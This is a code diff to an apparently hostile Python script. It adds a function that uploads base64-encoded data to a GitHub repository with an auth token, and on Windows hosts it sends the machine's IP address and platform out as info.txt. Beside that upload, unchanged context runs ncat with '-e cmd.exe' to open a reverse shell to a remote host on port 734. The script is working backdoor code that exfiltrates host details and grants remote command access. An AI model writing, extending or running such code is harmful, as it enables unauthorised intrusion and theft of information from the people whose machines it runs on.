@@ -5,6 +5,23 @@ import socket
 import json
 
 
+def subir_archivo( nombre_archivo, contenido_archivo):
+    url = f"https://api.github.com/repos/kaki714/Not/contents/data/{nombre_archivo}"
+    headers = {
+        "Authorization": f"token {token}",
+        "Content-Type": "application/json"
+    }
+    contenido_base64 = b64encode(contenido_archivo.encode()).decode()
+    data = {
+        "message": "Agregar archivo",
+        "content": contenido_base64
+    }
+    response = requests.post(url, json=data, headers=headers)
+    if response.status_code == 201:
+        print("Archivo subido exitosamente")
+    else:
+        print(f"Error al subir el archivo: {response.json()['message']}")
+
 
 def run():
     hostname=socket.gethostname()   
@@ -29,6 +46,8 @@ def run():
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
         print('Address ip: ', IPAddr)
+        stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
+        subir_archivo('info.txt', stmnt )
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
     
